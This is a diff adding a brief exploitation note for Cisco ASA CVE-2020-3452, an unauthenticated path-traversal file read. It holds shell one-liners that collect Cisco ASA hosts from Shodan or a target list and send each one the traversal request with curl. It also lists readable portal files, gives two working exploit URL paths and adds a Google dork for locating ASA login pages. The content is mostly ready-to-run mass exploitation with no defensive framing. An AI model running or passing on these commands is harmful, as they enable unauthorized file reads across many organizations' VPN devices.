@@ -1,0 +1,75 @@
+Cisco ASA CVE-2020–3452
+
+Assets -
+
+Hunting Using Shodan - 
+shodan search Cisco ASA --fields ip_str --separator " " | awk '{print $1}' | while read host do ; do curl -s -k  "https://$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" ; done
+
+
+Hunting Using Subdomain Enumeration - 
+
+cat targets.json | awk '{print $1}' | while read host do ; do curl -s -k  "https://$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" ; done
+
+
+Entry Points - 
+
+File Entry Points 
+
+
+logo.gif
+http_auth.html
+user_dialog.html
+localization_inc.lua
+portal_inc.lua
+include
+nostcaccess.html
+ask.html
+no_svc.html
+svc.html
+session.js
+useralert.html
+ping.html
+help
+app_index.html
+tlbr
+portal_forms.js
+logon_forms.js
+win.js
+portal.css
+portal.js
+sess_update.html
+blank.html
+noportal.html
+portal_ce.html
+portal.html
+home
+logon_custom.css
+portal_custom.css
+preview.html
+session_expired
+custom
+portal_elements.html
+commonspawn.js
+common.js
+appstart.js
+appstatus
+relaymonjar.html
+relaymonocx.html
+relayjar.html
+relayocx.html
+portal_img
+color_picker.js
+color_picker.html
+cedhelp.html
+cedmain.html
+cedlogon.html
+
+Endpoint that read unauthenticate file read:
+
+ https://$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+ /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
+
+Dork:
+	# Exploit Title: inurl:/+CSCOE+/logon.html?
+	# Google Dork: inurl:/+CSCOE+/logon.html?
